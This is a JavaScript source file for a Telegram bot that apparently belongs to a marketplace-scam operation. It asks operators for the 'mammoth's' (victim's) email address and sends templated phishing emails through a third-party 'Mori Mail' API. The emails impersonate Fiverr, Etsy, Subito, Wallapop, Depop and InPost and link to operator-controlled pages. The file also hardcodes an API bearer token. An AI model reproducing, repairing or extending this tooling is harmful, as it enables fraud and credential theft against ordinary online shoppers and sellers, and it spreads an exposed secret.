const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");
const { Ad, Service } = require("../database");
const myAd = require("../commands/myCreateAd");
const log = require("../helpers/log");
const axios = require("axios");

const sendEmail = async (ctx, ad, service, sendService) => {
  try {
    const serviceCode = sendService[ad.serviceCode];

    if (!serviceCode) {
      return ctx.reply("❌ Код страны или сервиса не найден.");
    }
    const response = await axios.post(
      "https://morimailapi.morimail.cc/v2/mail/send",
      {
        recipient: ctx.scene.state.data.mail,
        template: sendService[ad.serviceCode],
        template_params: {
          url: `https://${service.domain}/mm/${ad.id}`,
          product_name: ad.title || "Unknown",
        },
        user: {
          telegram_id: ctx.from.id,
          telegram_username: ctx.from.username || "Unknown",
        },
      },
      {
        timeout: 6000,
        headers: {
          Authorization: "Bearer 3KFbSLm77MGdbcXotugJLCFVIvi1xrWaBlX8S9pUp3K1D0JJOj",
        },
      }
    );
if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }

    // Проверяем статус ответа
    if (response.status === 200) {
      await ctx.reply('<b>✅ Письмо успешно отправлено на указанный адрес</b>', {
        reply_to_message_id: ctx.message.message_id,
        parse_mode: 'HTML',
      });
    }

    log(
      ctx,
      `📧 <b>Письмо отправлено</b>:\n\n📍 <b>Сервис:</b> ${service.title}\n📬 <b>Почта мамонта:</b> ${ctx.scene.state.data.mail}\n🔗 <b>Ссылка:</b> <a href="https://${service.domain}/${ad.id}">Перейти</a>\n\n<i>Mori MAIL</i>`
    );
  } catch (err) {
    if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }

    console.error("Ошибка при отправке письма (Mori Mail):", err.message);

    // Обработка тайм-аута и других ошибок
    if (err.code === "ECONNABORTED") {
      await ctx.reply("❌ Тайм-аут: сервер слишком долго не отвечает.");
    } else {
      if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }

      await ctx.reply(
        `<b>❌ Ошибка при отправке письма для сервиса ${service.title}!</b>
        
Сендер: <b>Mori Mail</b>      

Ошибка: <b>${err.response?.data?.error_message ||
        err.response?.data?.error ||
        err.response?.data?.message ||
        JSON.stringify(err.response?.data) ||
        err.message ||
        "Неизвестная ошибка"
        }</b>
  
<i>Пожалуйста, перешлите это сообщение разработчику для решения данной проблемы.</i>`,
        {
          parse_mode: "HTML",
                reply_to_message_id: ctx.message.message_id,

        }
      );
    }

  }
};

const scene = new WizardScene(
  "sendMailAd7",
  async (ctx) => {
    try {
      await ctx.scene.reply("Введите почту мамонта", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {}; // Инициализация state
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
  try {
    // Захват и валидация почты
    if (ctx.message?.text) {
      ctx.scene.state.data.mail = ctx.message.text;
    } else {
      await ctx.scene.reply("❌ Пожалуйста, введите действительный адрес электронной почты.");
      return;
    }

    const ad = await Ad.findOne({ where: { id: ctx.scene.state.adId } });
    const service = await Service.findOne({ where: { code: ad.serviceCode } });

    const sendService = {
      fiverr_com: "fiverr_en",
      fiverr_eu: "fiverr_verif_en",
      etsy_eu: "etsy_en",
      etsyverif_eu: "etsy_com_custom",
      subito_it: "subito_it",
      wallapop_uk: "wallapop_en",
      wallapop_es: "wallapop_es",
      depop_uk: "depop_en",
      depop_us: "depop_en",
      inpost_pl: "inpost_pl"
    };

    const loadingMsg = await ctx.reply("⏳ Письмо отправляется...");

      const miniCtx = {
        from: ctx.from,
        message: ctx.message,
        reply: (...args) => ctx.reply(...args),
        deleteMessage: (...args) => ctx.deleteMessage(...args),
        tempMessageId: loadingMsg.message_id,
        scene: {
          state: {
            data: {
              mail: ctx.scene.state.data.mail,
            },
          },
        },
      };

      setImmediate(() => {
        sendEmail(miniCtx, ad, service, sendService).catch((err) =>
          console.error("Ошибка при отправке письма:", err)
        );
      });

      return ctx.scene.leave();

    } catch (err) {
      console.log(err);
      await ctx.deleteMessage(loadingMsg.message_id).catch(() => { });

      await ctx.replyWithHTML(
        `<b>❌ Ошибка при отправке письма!</b>\nОшибка сервера: <b>${err.message}</b>`
      );
      return ctx.scene.leave();
    }
  }
);

scene.leave((ctx) => myAd(ctx, ctx.scene.state.adId));
module.exports = scene;
